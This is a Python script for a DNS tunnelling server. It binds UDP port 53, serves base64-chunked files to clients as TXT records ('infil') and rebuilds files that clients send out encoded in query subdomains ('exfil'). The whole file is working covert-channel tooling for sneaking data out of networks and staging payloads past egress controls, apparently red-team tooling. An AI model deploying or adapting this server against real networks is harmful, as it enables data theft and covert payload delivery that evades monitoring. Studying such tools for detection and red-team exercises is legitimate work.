#!/usr/bin/python
import socket
import logging
import dns
import dns.message
# import string
# from binascii import b2a_base64
import base64
import re
import argparse
import sys
import os


# Override/Modify this function to change the behavior of the server for any given query. Probably should strip whitespace.
# The current implementation uses sequential id's starting at 'startValue' - so 1.subdomain.domain.com, 2.subdomain.domain.com...
# return None when done
def get_response_data(query_name):
	itemNumber = int(query_name[0:str(query_name).find('.')]) - args.startValue
	if itemNumber < 0 or itemNumber >= len(dataItems):
		return None
	else:
		logging.info('[+] Pulling data for payload number ' + str(itemNumber) + '/' + str(len(dataItems) - 1))
	return re.sub('\s+',' ',dataItems[itemNumber])


def chunks(l, n):
	'''Split string l into n sized chunks'''
	for i in xrange(0, len(l), n):
		yield l[i:i + n]


def handle_query_infil(msg,address):
	qs = msg.question
	logging.debug('[+] ' + str(len(qs)) + ' questions.')

	for q in qs:
		resp = dns.message.make_response(msg)
		resp.flags |= dns.flags.AA
		resp.set_rcode(0)
		if(resp):
			response_data = get_response_data(str(q.name))
			if response_data:
				rrset = dns.rrset.from_text(q.name, 7600,dns.rdataclass.IN, dns.rdatatype.TXT, response_data)
				resp.answer.append(rrset)
				logging.debug('[+] Response created - sending TXT payload: ' + response_data)
				s.sendto(resp.to_wire(), address)
			else:
				logging.debug('[-] No more data - item requested exceeds range')
				return
		else:
			logging.error('[x] Error creating response, not replying')
			return


def handle_query_exfil(msg,address):
	qs = msg.question
	logging.debug('[+] ' + str(len(qs)) + ' questions.')

	for q in qs:
		requestedDomain = str(q.name)
		dataPart = requestedDomain.split(".exfil.")[0]
		resp = dns.message.make_response(msg)
		resp.flags |= dns.flags.AA
		resp.set_rcode(0)
		if(resp):
			response_data = "ACK"
			if response_data:
				rrset = dns.rrset.from_text(q.name, 7600,dns.rdataclass.IN, dns.rdatatype.TXT, response_data)
				resp.answer.append(rrset)
				logging.debug('[+] Response created - sending TXT payload: ' + response_data)
				s.sendto(resp.to_wire(), address)
				return dataPart
			else:
				logging.debug('[-] No more data - item requested exceeds range')
				return
		else:
			logging.error('[x] Error creating response, not replying')
			return


def writeToFile(base64data, fileName):
	logging.debug("~ Received data file contents below ~")
	logging.debug(fileName)
	logging.debug(base64data)

	actualb64data = base64data.replace("-p", "+").replace("-s", "/").replace("-e","=")
	fileData = base64.b64decode(actualb64data)
	with open(fileName, 'wb') as f:
		f.write(fileData)

	logging.info("Received file {0}".format(fileName))

	print("\n")


# Handle incoming requests on port 53
def requestHandler(address, message):
	serving_ids = []

	# Don't try to respond to the same request twice somehow - track requests
	message_id = ord(message[0]) * 256 + ord(message[1])
	logging.debug('[+] Received message ID = ' + str(message_id))
	if message_id in serving_ids:
		# This request is already being served
		logging.debug('[-] Request already being served - aborting')
		return

	serving_ids.append(message_id)

	msg = dns.message.from_wire(message)
	op = msg.opcode()
	if op == 0:
		# standard and inverse query
		qs = msg.question
		if len(qs) > 0 and "IN PTR" not in str(qs[0]):
			q = qs[0]
			qlower = str(q).lower()
			logging.debug('[+] DNS request is: ' + qlower)

			if "infil" in qlower:
				try:
					handle_query_infil(msg,address)
				except:
					logging.error('[x] Could not handle the incoming request')

			elif "exfil" in qlower:
				try:
					return handle_query_exfil(msg,address)
				except:
					logging.error('[x] Could not handle the incoming request')

			else:
				logging.error('[x] Could not handle the incoming request')
	else:
		# not implemented
		logging.error('[x] Received invalid request')

	serving_ids.remove(message_id)


if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument("-f", "--file", help="File to split up and serve")
	parser.add_argument("-d", "--directory", help="Directory with contents to serve")
	parser.add_argument("-s", "--startValue", default=0, type=int, help='Start value for subdomain request ids. This MUST match the value set in the client, default 0')
	parser.add_argument("-l", "--logging", default="d", help='Set logging level. Default is debug')
	args = parser.parse_args()

	if(len(sys.argv) < 2):
		parser.print_help()
		sys.exit(0)

	if args.logging == "i":
		logging.basicConfig(level=logging.INFO)
	elif args.logging == "e":
		logging.basicConfig(level=logging.ERROR)
	else:
		logging.basicConfig(level=logging.DEBUG)

	# inFile = open(args.file, "rb").read()
	# inData = b2a_base64(inFile)
	dataItems = []
	if args.file:
		with open(args.file, "rb") as inFile:
			inData = base64.b64encode(inFile.read())

		dataItems = list(chunks(inData,200))
		dataItems.append("EOF")
		logging.info('[+] There are ' + str(len(dataItems)) + ' parts to this file')

	elif args.directory:
		directoryContents = os.listdir(args.directory)
		logging.info('[+] Serving contents of directory ' + str(args.directory))

	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(('', 53))
	logging.debug('[+] Bound to UDP port 53.')
	serving_ids = []
	incomingData = []
	fileName = 'placeholder'

	while True:
		logging.debug('[+] Waiting for request...')
		message, address = s.recvfrom(1024)
		ip, port = s.getsockname()

		#if configured to work with directory, create dataItems addhoc

		logging.debug('[+] Request received, serving ' + str(address[0]))
		dataPart = requestHandler(address, message)
		if dataPart:
			if (dataPart != "EOF") and ("SOF" not in dataPart):
				incomingData.append(dataPart)

			elif "SOF" in dataPart:
				incomingData = []
				fileName = dataPart.split(".", 1)[1]
				logging.info('[+] Started receiving file: ' + fileName)

			elif dataPart == "EOF":
				writeToFile(''.join(incomingData), fileName)
